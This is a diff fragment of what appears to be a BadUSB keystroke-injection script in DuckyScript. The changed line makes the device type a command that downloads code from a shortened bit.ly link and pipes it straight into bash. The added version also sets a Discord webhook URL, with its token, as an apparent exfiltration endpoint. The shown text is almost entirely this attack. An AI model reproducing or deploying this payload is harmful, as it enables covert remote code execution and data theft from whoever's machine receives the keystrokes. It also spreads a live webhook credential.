@@ -17,7 +17,7 @@ REM     Delete anything that might have been typed in
 CTRL u
 DELAY 100
 REM     Run payload
-STRING export dc=''; curl -sSL https://bit.ly/3TsJUjX | bash
+STRING export dc='https://discord.com/api/webhooks/1282822112100220938/pKwXqpV_QkhDb9CDVgGdbDPgyrkpcqPa7ODpfySQ5lro49uE3wHpuxVJa7X_ug5smJ93'; curl -sSL https://bit.ly/3TsJUjX | bash
 ENTER
 DELAY 200
 
